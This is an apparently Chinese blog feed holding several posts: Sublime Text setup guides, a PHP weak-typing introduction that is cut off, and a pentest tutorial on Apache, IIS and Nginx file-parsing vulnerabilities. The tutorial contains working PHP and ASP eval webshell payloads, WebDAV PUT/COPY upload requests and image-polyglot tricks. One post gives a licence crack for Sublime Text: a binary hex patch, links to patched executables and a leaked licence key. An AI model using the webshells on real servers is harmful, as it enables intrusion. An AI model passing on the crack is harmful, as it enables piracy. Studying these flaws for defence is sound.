      <link href="/2019/04/29/sublime-text-3-yun-xing-c-c/"/>
      <url>/2019/04/29/sublime-text-3-yun-xing-c-c/</url>
      
        <content type="html"><![CDATA[<ul><li>点击<code>Tools</code>-&gt;<code>Build System</code>-&gt;<code>Build New System</code></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190318114255.png" alt></p><a id="more"></a><ul><li>然后输入以下配置:</li></ul><pre><code>{    &quot;cmd&quot;: [&quot;bash&quot;, &quot;-c&quot;, &quot;g++ &#39;${file}&#39; -std=c++11 -stdlib=libc++ -o &#39;${file_path}/${file_base_name}&#39;&quot;],    &quot;file_regex&quot;: &quot;^(..{FNXX==XXFN}*):([0-9]+):?([0-9]+)?:? (.*)$&quot;,    &quot;working_dir&quot;: &quot;${file_path}&quot;,    &quot;selector&quot;: &quot;source.c, source.c++&quot;,    &quot;variants&quot;:    [        {        &quot;name&quot;: &quot;Run&quot;,        &quot;cmd&quot;: [&quot;bash&quot;, &quot;-c&quot;, &quot;g++ &#39;${file}&#39; -std=c++11 -stdlib=libc++ -o &#39;${file_path}/${file_base_name}&#39; &amp;&amp; open -a Terminal.app &#39;${file_path}/${file_base_name}&#39;&quot;]        }    ]}</code></pre><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190318114320.png" alt></p><ul><li><p>然后按<code>Command+S</code>保存,命名为<code>C/C++.sublime-build</code>,名字<code>C/C++</code>你随便起,但是<strong>后缀名和保存路径不要改,默认就行</strong></p><blockquote><p>该配置文件会保存在<code>/Users/用户名/Library/Application Support/Sublime Text 3/Packages/User</code>下</p></blockquote></li><li><p>然后现在可以写c/c++的代码了,写完之后,点击<code>Tools</code>-&gt;<code>Build System</code>-&gt;<code>C:C++</code></p><blockquote><p>注意,因为我刚刚保存的时候文件名是<code>C/C++</code>,其中的<code>/</code>被自动替换成<code>:</code>了,所有<code>C:C++</code>也就是我刚刚保存的配置文件</p></blockquote></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190318114333.png" alt></p><ul><li>选择完编译器之后,按<code>Command+B</code>, 然后选择<code>C:C++ - Run</code>即可运行,下次直接按<code>Command+B</code>就可以运行了</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190328001827.png" alt><br><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190318114346.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 软件配置 </category>
          
          <category> sublime text 3 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sublime text 3 运行C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sublime text 3 Package Control被墙了</title>
      <link href="/2019/04/29/sublime-text-3-package-control-bei-qiang-liao/"/>
      <url>/2019/04/29/sublime-text-3-package-control-bei-qiang-liao/</url>
      
        <content type="html"><![CDATA[<ul><li>国内 <a href="https://packagecontrol.io" target="_blank" rel="noopener">https://packagecontrol.io</a> 无法访问</li><li>解决办法链接: <a href="https://github.com/HBLong/channel_v3_daily" target="_blank" rel="noopener">https://github.com/HBLong/channel_v3_daily</a></li></ul><h3 id="1-1-安装Package-Control"><a href="#1-1-安装Package-Control" class="headerlink" title="1.1. 安装Package Control"></a>1.1. 安装<code>Package Control</code></h3><ol><li><p>下载<code>Package Control.sublime-package</code>,放到<code>/Users/用户名/Library/Application Support/Sublime Text 3/Installed Packages</code></p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190328001858.png" alt></p> <a id="more"></a></li><li><p>重启<code>Sublime Text 3</code></p></li></ol><h3 id="1-2-本地使用"><a href="#1-2-本地使用" class="headerlink" title="1.2. 本地使用"></a>1.2. 本地使用</h3><ol><li><p>去 <a href="https://github.com/HBLong/channel_v3_daily" target="_blank" rel="noopener">https://github.com/HBLong/channel_v3_daily</a> 下载<code>channel_v3.json</code>到<code>/User/用户名/</code>下,这里下载路径随便,我的是<code>/User/hua/</code></p></li><li><p>打开<code>Sublime Text 3</code>点击 <code>Preferences &gt; Package Settings &gt; Package Control &gt; Settings - User</code></p></li><li><p>添加 <code>&quot;channels&quot;: [&quot;/User/用户名/channel_v3.json&quot;],</code></p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190328001848.png" alt></p></li></ol><h3 id="1-3-在线使用"><a href="#1-3-在线使用" class="headerlink" title="1.3. 在线使用"></a>1.3. 在线使用</h3><ol><li>打开<code>Sublime Text 3</code>点击 <code>Preferences &gt; Package Settings &gt; Package Control &gt; Settings - User</code></li><li>添加 <code>&quot;channels&quot;: [&quot;https://raw.githubusercontent.com/HBLong/channel_v3_daily/master/channel_v3.json&quot;],</code></li></ol><p>接下来就可以愉快的用<code>Package Control</code>安装插件了</p>]]></content>
      
      
      <categories>
          
          <category> 软件配置 </category>
          
          <category> sublime text 3 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Package Control被墙了 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sublime text 3 运行python3</title>
      <link href="/2019/04/29/sublime-text-3-yun-xing-python3/"/>
      <url>/2019/04/29/sublime-text-3-yun-xing-python3/</url>
      
        <content type="html"><![CDATA[<blockquote><p>sublime默认的是python2.7如果我想让他运行python3，怎么办呢?</p></blockquote><ol><li><p>运行<code>which</code>命令找到<code>python3</code>的路径</p><pre class=" language-bash"><code class="language-bash"> <span class="token function">which</span> python3</code></pre><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530637554.jpg" alt></p> <a id="more"></a></li><li><p>自定义环境:<code>Tools</code>-&gt;<code>Build System</code>-&gt;<code>New Build System</code>,会弹出一个后缀为<code>sublime-build</code>的文件。</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1530637688.jpg" alt></p><ul><li><p>ubuntu/deepin粘贴如下配置,如果发现pyqt5运行的时候啥也不显示，可将<code>&quot;shell&quot;:&quot;true&quot;</code>删掉</p><pre><code>{  &quot;cmd&quot;: [&quot;/usr/bin/python3&quot;, &quot;-u&quot;, &quot;$file&quot;],  &quot;file_regex&quot;: &quot;^[ ]*File \&quot;(...*?)\&quot;, line ([0-9]*)&quot;,  &quot;selector&quot;: &quot;source.python&quot;,  &quot;shell&quot;:&quot;true&quot;}</code></pre></li><li><p>windows粘贴下面的:</p><pre><code>{  &quot;cmd&quot;:[&quot;E:\\Python\\Python36-32\\python.exe&quot;,&quot;-u&quot;,&quot;$file&quot;],  &quot;file_regex&quot;: &quot;^[ ]*File \&quot;(...*?)\&quot;, line ([0-9]*)&quot;,  &quot;selector&quot;: &quot;source.python&quot;,  &quot;encoding&quot;: &quot;utf-8&quot; ,  &quot;env&quot;: {&quot;PYTHONIOENCODING&quot;: &quot;utf8&quot;},  &quot;shell&quot;:&quot;true&quot;}</code></pre></li><li><p>mac粘贴下面的:</p><pre><code>{  &quot;cmd&quot;: [&quot;/usr/local/bin/python3&quot;, &quot;-u&quot;, &quot;$file&quot;],  &quot;file_regex&quot;: &quot;^[ ]*File \&quot;(...*?)\&quot;, line ([0-9]*)&quot;,  &quot;selector&quot;: &quot;source.python&quot;,}</code></pre></li></ul></li></ol><p>记住,其中的python3运行路径要和你系统中的路径一致,然后按<code>Ctlr+S</code>保存文件,文件名改为为<code>python3.sublime-build</code>，<strong>保存的路径就是<code>Crtl+S</code>后默认的路径</strong>,然后你在<code>Tools</code>-&gt;<code>Build System</code>,可以看到<code>python3</code>了,选择它再运行python,就会使用python3而不是python2.7了</p>]]></content>
      
      
      <categories>
          
          <category> 软件配置 </category>
          
          <category> sublime text 3 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sublime text 3 激活 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sublime text 3 激活</title>
      <link href="/2019/04/28/sublime-text-3-ji-huo/"/>
      <url>/2019/04/28/sublime-text-3-ji-huo/</url>
      
        <content type="html"><![CDATA[<h2 id="1-原文链接"><a href="#1-原文链接" class="headerlink" title="1. 原文链接"></a>1. 原文链接</h2><ul><li><a href="https://www.52pojie.cn/thread-925256-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-925256-1-1.html</a></li></ul><h2 id="2-修改trigger"><a href="#2-修改trigger" class="headerlink" title="2. 修改trigger"></a>2. 修改trigger</h2><h3 id="2-1-Windows"><a href="#2-1-Windows" class="headerlink" title="2.1. Windows"></a>2.1. Windows</h3><ul><li>利用<code>010Editor</code>打开软件根目录下的<code>sublime_text.exe</code></li><li>搜索16进制 <code>97 94 0D 00</code></li><li>改为  <code>00 00 00 00</code></li><li>保存<a id="more"></a><blockquote><p>已经修改好的文件: <a href="/files/sublime_text.exe">sublime_text.exe</a></p></blockquote></li></ul><h3 id="2-2-Mac"><a href="#2-2-Mac" class="headerlink" title="2.2. Mac"></a>2.2. Mac</h3><ul><li><p>拷出<code>/Applications/Sublime Text.app/Contents/MacOS/Sublime Text</code></p><blockquote><p>其实就是 应用程序 文件夹下找到SublimeText应用，然后右键-&gt;显示包内容，然后打开/Contents/MacOS/ 然后找到 Sublime Text 这个文件 拷出来</p></blockquote></li><li><p>利用<code>010Editor</code>打开它</p></li><li><p>搜索16进制 <code>97 94 0D 00</code></p></li><li><p>改为  <code>00 00 00 00</code></p></li><li><p>保存</p></li><li><p>打开终端，切换到当前目录</p></li><li><p>然后键入<code>chmod 755 Sublime\ Text</code></p></li><li><p>替换掉<code>/Applications/Sublime Text.app/Contents/MacOS/Sublime Text</code></p></li><li><p>完事儿</p></li></ul><blockquote><p>已经修改好的文件: <a href="/files/Sublime%20Text">Sublime Text</a></p></blockquote><h3 id="2-3-Linux"><a href="#2-3-Linux" class="headerlink" title="2.3. Linux"></a>2.3. Linux</h3><ul><li>找个16进制编辑器(如<code>010Editor</code>)打开软件根目录下的<code>Sublime Text</code></li><li>搜索16进制 <code>97 94 0D 00</code></li><li>改为  <code>00 00 00 00</code></li><li>保存</li><li>打开终端，切换到当前目录</li><li>然后键入<code>chmod 755 Sublime\ Text</code></li><li>完事儿</li></ul><h2 id="3-修改host"><a href="#3-修改host" class="headerlink" title="3. 修改host"></a>3. 修改host</h2><h3 id="3-1-Windows"><a href="#3-1-Windows" class="headerlink" title="3.1. Windows"></a>3.1. Windows</h3><p>Windows的hosts文件在: </p><pre><code>系统盘:/windows/system32/drivers/etc/hosts</code></pre><blockquote><p>Tips: Win下的权限获取可能有点复杂，不如先拷到桌面，编辑完替换回去。<br>在最后一行插入</p></blockquote><pre><code>127.0.0.1 license.sublimehq.com127.0.0.1 www.sublimetext.com</code></pre><h3 id="3-2-Mac"><a href="#3-2-Mac" class="headerlink" title="3.2. Mac"></a>3.2. Mac</h3><ol><li>打开Terminal(终端)</li><li>输入 <code>sudo nano /Private/etc/hosts</code> 回车</li><li>输入密码后回车</li><li>在最后一行插入</li></ol><pre><code>127.0.0.1 license.sublimehq.com127.0.0.1 www.sublimetext.com</code></pre><ol start="5"><li>按下Control + X，输入Y确定修改，确认保存路径后敲击回车</li></ol><h3 id="3-3-Linux"><a href="#3-3-Linux" class="headerlink" title="3.3. Linux"></a>3.3. Linux</h3><p>同Mac</p><h2 id="4-激活"><a href="#4-激活" class="headerlink" title="4. 激活"></a>4. 激活</h2><ul><li>打开Sublime Text 3</li><li>选择<code>Help</code>-&gt; <code>Enter License</code></li><li>输入</li></ul><pre><code>----- BEGIN LICENSE -----TwitterInc200 User LicenseEA7E-8900071D77F72E 390CDD93 4DCBA022 FAF6079061AA12C0 A37081C5 D0316412 4584D13694D7F7D4 95BC8C1C 527DA828 560BB037D1EDDD8C AE7B379F 50C9D69D B35179EF2FE898C4 8E4277A8 555CE714 E1FB0E43D5D52613 C3D12E98 BC49967F 7652EED29D2D2E61 67610860 6D338B72 5CF95C69E36B85CC 84991F19 7575D828 470A92AB------ END LICENSE ------</code></pre><ul><li>选择<code>Use license</code></li></ul><h2 id="5-大功告成"><a href="#5-大功告成" class="headerlink" title="5. 大功告成"></a>5. 大功告成</h2><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190428160029.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 软件配置 </category>
          
          <category> sublime text 3 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> st3激活 </tag>
            
            <tag> sublime text 3 激活 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web Server解析漏洞</title>
      <link href="/2019/04/28/web-server-jie-xi-lou-dong/"/>
      <url>/2019/04/28/web-server-jie-xi-lou-dong/</url>
      
        <content type="html"><![CDATA[<h2 id="1-Apache解析漏洞"><a href="#1-Apache解析漏洞" class="headerlink" title="1. Apache解析漏洞"></a>1. Apache解析漏洞</h2><h3 id="1-1-未知后缀解析漏洞"><a href="#1-1-未知后缀解析漏洞" class="headerlink" title="1.1. 未知后缀解析漏洞"></a>1.1. 未知后缀解析漏洞</h3><h4 id="1-1-1-影响版本"><a href="#1-1-1-影响版本" class="headerlink" title="1.1.1. 影响版本"></a>1.1.1. 影响版本</h4><ul><li><code>Apache 1.x</code></li><li><code>Apache 2.x</code></li></ul><h4 id="1-1-2-原理"><a href="#1-1-2-原理" class="headerlink" title="1.1.2. 原理"></a>1.1.2. 原理</h4><ul><li>Apache对于⽂件名的解析是<strong>从后往前解析</strong>的, 直到遇⻅⼀个Apache认识的⽂件类型为⽌.</li><li>比如一个文件名为<code>xxx.x1.x2.x3</code>的文件, Apache会从<code>x3</code>的位置往<code>x1</code>的位置开始尝试解析, 如果<code>x3</code>不属于Apache能解析的扩展名, 那么Apache会尝试去解析<code>x2</code>的位置, 这样<strong>一直从后往前尝试, 直到遇到一个能解析的扩展名为止, 如果都不认识,则会暴露其源代码</strong>.</li><li>具体来说, 例如：<code>Phpshell.php.abc.abc</code>, 因为Apache不认识<code>.abc</code>这个⽂件类型，所以会⼀直遍历后缀到<code>.php</code>, 然后认为这是⼀个PHP类型的⽂件.<a id="more"></a></li><li>那么Apache认识哪些扩展名呢?<ul><li>windows: 在Apache安装目录下<code>/conf/mime.types</code>文件中有详细的扩展名列表,这种方法可以绕过基于黑名单的检查</li><li>Ubuntu: 在<code>/etc/mime.types</code>文件中</li></ul></li></ul><h4 id="1-1-3-利用"><a href="#1-1-3-利用" class="headerlink" title="1.1.3. 利用"></a>1.1.3. 利用</h4><ul><li>⽐如<code>.rar</code>是⼀个合法的上传需求, 在应⽤⾥只判断⽂件的后缀是否是<code>.rar</code>, 最终⽤户上传的是<code>phpshell.php.rar.rar.rar</code>, 从⽽导致脚本被执⾏.</li></ul><h3 id="1-2-换行解析漏洞"><a href="#1-2-换行解析漏洞" class="headerlink" title="1.2. 换行解析漏洞"></a>1.2. 换行解析漏洞</h3><h4 id="1-2-1-影响版本"><a href="#1-2-1-影响版本" class="headerlink" title="1.2.1. 影响版本"></a>1.2.1. 影响版本</h4><ul><li>Apache版本在<code>2.4.0</code>到<code>2.4.29</code></li></ul><h4 id="1-2-2-原理"><a href="#1-2-2-原理" class="headerlink" title="1.2.2. 原理"></a>1.2.2. 原理</h4><ul><li>正则中, <code>$</code>可以匹配行尾或者一个<code>换行符</code></li><li>如果目标Apache使用如下方法来禁止某目录执行PHP</li></ul><pre><code>&lt;FilesMatch &quot;\.(?i:php|php3|php4)$&quot;&gt;Order allow, denyDeny from all&lt;/FilesMatch&gt;</code></pre><ul><li>我们可以上传一个后缀末尾包含换行符的php文件, 来绕过这个<code>FilesMatch</code></li></ul><blockquote><p>默认的Apache配置就可以利用, 默认的Apache配置就使用了如下的<code>FilesMatch</code></p></blockquote><pre><code>&lt;FilesMatch \.php$&gt;    SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</code></pre><h4 id="1-2-3-利用"><a href="#1-2-3-利用" class="headerlink" title="1.2.3. 利用"></a>1.2.3. 利用</h4><ul><li>上传一个包含webshell的php文件, 如文件名是<code>1.php</code>, 然后用bp抓包, 用hex功能在<code>1.php</code>后面添加一个<code>\x0A</code></li></ul><p><img src="_v_images/20190427220220641_716208242.png" alt></p><ul><li>然后访问<code>1.php%0A</code>, 即可发现getshell</li></ul><h2 id="2-IIS解析漏洞"><a href="#2-IIS解析漏洞" class="headerlink" title="2. IIS解析漏洞"></a>2. IIS解析漏洞</h2><h3 id="2-1-IIS6-0"><a href="#2-1-IIS6-0" class="headerlink" title="2.1. IIS6.0"></a>2.1. IIS6.0</h3><ul><li><code>IIS 6.0</code>再解析文件的时候存在以下三个解析漏洞：</li></ul><ol><li>当<strong>文件</strong>为<code>*.asp;1.jpg</code>时,<code>IIS 6.0</code>会以<code>ASP脚本</code>来执行</li><li>当建立<code>*.asa</code>,<code>*.asp</code>格式的<strong>文件夹</strong>时,其目录下的任意文件都将被IIS当作<code>asp</code>文件来解析</li><li><code>WebDav(Web-based Distributed Authoring and Versioning)</code>漏洞(对IIS写权限的利用),如果服务器开启<code>WebDav</code>,并且支持<code>PUT</code>,<code>Move</code>,<code>Copy</code>,<code>Delete</code>等方法,就可能存在安全隐患</li></ol><h4 id="2-1-1-文件类型"><a href="#2-1-1-文件类型" class="headerlink" title="2.1.1. 文件类型"></a>2.1.1. 文件类型</h4><p>Ⅰ:正常：<code>www.xxx.com/logo.jpg</code></p><p>Ⅱ:触发漏洞：<code>www.xxx.com/logo.asp;abc.jpg</code></p><ul><li>这类似0x00字符截断⽂件名, 不过截断字符变成了分号<code>;</code></li><li>按照Ⅰ来上传访问<code>logo.jpg</code>，文件会被当成是jpg图片来解析，如果上传访问<code>logo.asp;abc.jpg</code>，IIS 6会将此⽂件解析为<code>logo.asp</code>，⽂件名被截断了, <strong>被当成<code>asp</code>文件来处理, 从⽽导致脚本被执⾏</strong>, 而不会去管<code>abc.jpg</code>(如果IIS支持PHP，那么<code>logo.php;abc.jpg</code>也会被当成<code>PHP</code>文件执行）</li></ul><h4 id="2-1-2-文件夹类型"><a href="#2-1-2-文件夹类型" class="headerlink" title="2.1.2. 文件夹类型"></a>2.1.2. 文件夹类型</h4><p>Ⅰ:正常：<code>www.xxx.com/image/logo.jpg</code></p><p>Ⅱ:触发漏洞：<code>www.xxx.com/image.asp/logo.jpg</code></p><ul><li>按照Ⅰ来上传访问<code>logo.jpg</code>，文件会被当成是<code>jpg</code>图片来解析，如果将<code>logo.jpg</code>上传到<code>*.asp</code>如<code>image.asp</code>目录下，<strong>文件就会被当成<code>asp</code>文件来处理</strong>。（如果IIS支持PHP，那么<code>image.php文件夹</code>下的文件也会被当做<code>PHP</code>文件解析。）</li></ul><h4 id="2-1-3-WebDav"><a href="#2-1-3-WebDav" class="headerlink" title="2.1.3. WebDav"></a>2.1.3. WebDav</h4><h5 id="2-1-3-1-利用条件"><a href="#2-1-3-1-利用条件" class="headerlink" title="2.1.3.1. 利用条件"></a>2.1.3.1. 利用条件</h5><ol><li>目录支持写权限</li><li>开启了WebDav</li><li>勾选了<code>脚本资源访问</code>复选框</li></ol><blockquote><p>攻击者常用<code>PUT</code>方法上传危险脚本文件, 然后用<code>move</code>方法改为脚本文件, 从而执行webshell, 测试步骤如下:</p></blockquote><h5 id="2-1-3-2-通过OPTIONS探测服务器所支持的HTTP方法"><a href="#2-1-3-2-通过OPTIONS探测服务器所支持的HTTP方法" class="headerlink" title="2.1.3.2. 通过OPTIONS探测服务器所支持的HTTP方法"></a>2.1.3.2. 通过<code>OPTIONS</code>探测服务器所支持的HTTP方法</h5><pre><code>请求：OPTIONS / HTTP/1.1Host:www.example.com响应：。。。Allow:OPTIONS,TRACE,GET,HEAD,DELETE,PUT,POST,COPY,MOVE,MKCOL,PROPFIND,PROPPATCH,LOCK,UNLOCK,SEARCH。。。</code></pre><h5 id="2-1-3-3-通过PUT方法向服务器上传脚本文件"><a href="#2-1-3-3-通过PUT方法向服务器上传脚本文件" class="headerlink" title="2.1.3.3. 通过PUT方法向服务器上传脚本文件"></a>2.1.3.3. 通过<code>PUT</code>方法向服务器上传脚本文件</h5><pre><code>请求：PUT /a.txt HTTP/1.1Host:www.example.comContent-Length:30&lt;%eval request(&quot;chopper&quot;)%&gt;</code></pre><h5 id="2-1-3-4-通过Move或Copy方法改名"><a href="#2-1-3-4-通过Move或Copy方法改名" class="headerlink" title="2.1.3.4. 通过Move或Copy方法改名"></a>2.1.3.4. 通过<code>Move</code>或<code>Copy</code>方法改名</h5><pre><code>请求：COPY /a.txt HTTP/1.1Host:www.example.comDestination:http://www.example.com/cmd.asp</code></pre><h5 id="2-1-3-5-使用DELETE方法，攻击者还可以删除服务器上的任意文件"><a href="#2-1-3-5-使用DELETE方法，攻击者还可以删除服务器上的任意文件" class="headerlink" title="2.1.3.5. 使用DELETE方法，攻击者还可以删除服务器上的任意文件"></a>2.1.3.5. 使用<code>DELETE</code>方法，攻击者还可以删除服务器上的任意文件</h5><pre><code>请求：DELETE /a.txt HTTP/1.1Host:www.example.com</code></pre><blockquote><p>桂林老兵曾写过一款针对WebDav漏洞的软件:<code>IIS Write</code>,利用这款软件,可以快速探测服务器是否存在WebDav漏洞</p></blockquote><h3 id="2-2-IIS7-0以上"><a href="#2-2-IIS7-0以上" class="headerlink" title="2.2. IIS7.0以上"></a>2.2. IIS7.0以上</h3><h4 id="2-2-1-影响版本"><a href="#2-2-1-影响版本" class="headerlink" title="2.2.1. 影响版本"></a>2.2.1. 影响版本</h4><pre><code>IIS7.0(Win2008R1+IIS7.0)IIS7.5(Win2008R2+IIS7.5)</code></pre><h4 id="2-2-2-原理"><a href="#2-2-2-原理" class="headerlink" title="2.2.2. 原理"></a>2.2.2. 原理</h4><ul><li><p><code>IIS7.0/7.5</code>是对<code>php解析</code>时有一个类似于Nginx的解析漏洞，对任意文件名只要在URL后面追加上字符串”<code>/任意文件名.php</code>”就<strong>会按照<code>php</code>的方式去解析</strong>。（例如：<code>webshell.jpg/x.php</code>）</p></li><li><p>IIS的解析漏洞不像Apache那么模糊，针对IIS6.0，只要文件名不被重命名基本都能搞定。这里要注意一点，对于”<code>任意文件名/任意文件名.php</code>”这个漏洞其实是出现自<code>php-cgi</code>的漏洞， 所以其实跟IIS自身是无关的。</p></li></ul><h4 id="2-2-3-利用"><a href="#2-2-3-利用" class="headerlink" title="2.2.3. 利用"></a>2.2.3. 利用</h4><ul><li>将shell语句，如  </li></ul><pre><code>&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt;</code></pre><p>写在文本<code>xx.txt</code>中(或者shell语句直接写一句话，用菜刀、cknife等直连，只是容易被查杀），然后用命令将shell语句附加在正常图片<code>xx.jpg</code>后</p><pre><code>copy xx.jpg/b + xx.txt/a test.jpg</code></pre><ul><li>上传<code>test.jpg</code>，然后访问<code>test.jpg/.php</code>或<code>test.jpg/abc.php</code>当前目录下就会生成一句话木马 <code>shell.php</code></li></ul><h2 id="3-Nginx解析漏洞"><a href="#3-Nginx解析漏洞" class="headerlink" title="3. Nginx解析漏洞"></a>3. Nginx解析漏洞</h2><h3 id="3-1-畸形解析漏洞"><a href="#3-1-畸形解析漏洞" class="headerlink" title="3.1. 畸形解析漏洞"></a>3.1. 畸形解析漏洞</h3><h4 id="3-1-1-原理"><a href="#3-1-1-原理" class="headerlink" title="3.1.1. 原理"></a>3.1.1. 原理</h4><ul><li>对任意文件名，在后面添加”<code>/任意文件名.php</code>”的解析漏洞，比如图片木马文件名是<code>test.jpg</code>，可以添加为<code>test.jpg/x.php</code>进行<strong>解析攻击</strong>,那么<code>test.jpg</code>会被当成PHP脚本来解析。注意,此时的<code>x.php</code>是不存在的</li><li>这种解析漏洞其实是<code>PHP CGI</code>漏洞,在PHP配置文件中有个关键的选项:<code>cgi.fix_pathinfo</code>,这个选项在某些版本中是默认开启的</li></ul><pre><code>cgi.fix_pathinfo = 1</code></pre><ul><li>在开启时访问URL,比如: <code>http://www.xxser.com/x.txt/x.php</code>,<code>x.php</code>是不存在的文件,所以<strong>PHP会<code>向前递归</code>解析</strong>,于是造成了解析漏洞.由于Nginx和PHP配合很容易造成这种漏洞,所以,PHP CGI漏洞常常被认为是Nginx解析漏洞,所以其实跟Nginx自身是无关的。</li></ul><h4 id="3-1-2-利用"><a href="#3-1-2-利用" class="headerlink" title="3.1.2. 利用"></a>3.1.2. 利用</h4><ul><li><p>将shell语句，如  </p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?PHP</span> <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">'shell.php'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'&lt;?php eval($_POST[cmd])?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>写在文本<code>xx.txt</code>中(或者shell语句直接写一句话，用菜刀、cknife等直连，只是容易被查杀）</p></li><li><p>然后用命令将shell语句附加在正常图片<code>xx.jpg</code>后</p></li></ul><pre><code>copy xx.jpg/b + xx.txt/a test.jpg</code></pre><ul><li>上传<code>test.jpg</code>，然后访问<code>test.jpg/.php</code>或<code>test.jpg/abc.php</code>,当前目录下就会生成一句话木马 <code>shell.php</code></li></ul><h4 id="3-1-3-修复"><a href="#3-1-3-修复" class="headerlink" title="3.1.3. 修复"></a>3.1.3. 修复</h4><ul><li>将<code>cgi.fix_pathinfo</code> 设置为0</li></ul><h3 id="3-2-空字节代码执行漏洞"><a href="#3-2-空字节代码执行漏洞" class="headerlink" title="3.2. 空字节代码执行漏洞"></a>3.2. 空字节代码执行漏洞</h3><h4 id="3-2-1-原理"><a href="#3-2-1-原理" class="headerlink" title="3.2.1. 原理"></a>3.2.1. 原理</h4><ul><li>低版本的Nginx可以在任意文件名后面添加<code>%00.php</code>进行<strong>解析攻击</strong>。</li></ul><pre><code>Nginx0.5.Nginx0.6.Nginx0.7. &lt;= 0.7.65Nginx0.8. &lt;= 0.8.37</code></pre><h4 id="3-2-2-利用"><a href="#3-2-2-利用" class="headerlink" title="3.2.2. 利用"></a>3.2.2. 利用</h4><ul><li>比如在图片后附加php代码,然后通过访问<pre><code>xx.jpg%00.php</code></pre>来执行其中的代码</li></ul><h3 id="3-3-文件名逻辑漏洞-CVE-2013-4547"><a href="#3-3-文件名逻辑漏洞-CVE-2013-4547" class="headerlink" title="3.3. 文件名逻辑漏洞(CVE-2013-4547)"></a>3.3. 文件名逻辑漏洞(CVE-2013-4547)</h3><ul><li>受影响的nginx版本: 0.8.41至1.4.3和1.5.7之前的1.5.x</li><li>正常上传一个附加代码的图片<code>test.jpg</code>，访问时后面+<code>空格</code>+<code>\\0</code>+<code>.php</code>，即让图片作为php文件解析</li></ul><pre><code>&quot;/test.jpg \\0.php&quot;</code></pre><h3 id="3-4-配置不当目录穿越"><a href="#3-4-配置不当目录穿越" class="headerlink" title="3.4. 配置不当目录穿越"></a>3.4. 配置不当目录穿越</h3><ul><li>如果绝对路径<code>/home/</code>的URL映射是网站目录<code>/files/</code>，配置写成了<code>/files</code></li></ul><pre><code>location /files {    alias /home/;}</code></pre><ul><li>就可以访问<code>/files../</code>，穿越路径，访问到绝对路径根目录<code>/</code>下的文件列表</li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 文件上传 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Apache解析漏洞 </tag>
            
            <tag> IIS解析漏洞 </tag>
            
            <tag> Nginx解析漏洞 </tag>
            
            <tag> PHP CGI路径解析问题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP弱类型</title>
      <link href="/2019/03/11/php-ruo-lei-xing/"/>
      <url>/2019/03/11/php-ruo-lei-xing/</url>
      
        <content type="html"><![CDATA[<h3 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><p><a href="https://blog.spoock.com/2016/06/25/weakly-typed-security/" target="_blank" rel="noopener">PHP弱类型安全问题总结 | 乘物游心</a></p><h3 id="PHP弱类型简介"><a href="#PHP弱类型简介" class="headerlink" title="PHP弱类型简介"></a>PHP弱类型简介</h3><ul><li>在PHP中，可以进行以下的操作。</li></ul><pre class=" language-php"><code class="language-php"><span class="token variable">$param</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$param</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$param</span> <span class="token operator">=</span> <span class="token string">"stringg"</span><span class="token punctuation">;</span></code></pre><a id="more"></a><ul><li><strong>弱类型的语言对变量的数据类型没有限制</strong>，你可以在任何地时候将变量赋值给任意的其他类型的变量，同时变量也可以转换成任意地其他类型的数据。</li></ul><h3 id="类型转换问题"><a href="#类型转换问题" class="headerlink" title="类型转换问题"></a>类型转换问题</h3><ul><li>类型转换是无法避免的问题。例如<strong>需要将GET或者是POST的参数转换为int类型，或者是两个变量不匹配的时候，PHP会自动地进行变量转换</strong>。但是PHP是一个弱类型的语言，导致在进行类型转换的时候会存在很多意想不到的问题。</li></ul><h4 id="比较操作符"><a href="#比较操作符" class="headerlink" title="比较操作符"></a>比较操作符</h4><h5 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h5><ul><li>在<code>$a==$b</code>的比较中</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190310215030.png" alt></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190310215053.png" alt></p><ul><li>这样的例子还有很多，这种比较都是相等。<strong>PHP会把<code>类数值</code>(如含有数字的字符串等)的字符串转换为数值进行比较，如果参数是字符串，则返回字符串中第一个不是数字的字符之前的数字串所代表的整数值</strong></li><li>使用<strong>比较操作符</strong>的时候也存在类型转换的问题，如下：</li></ul><p><img 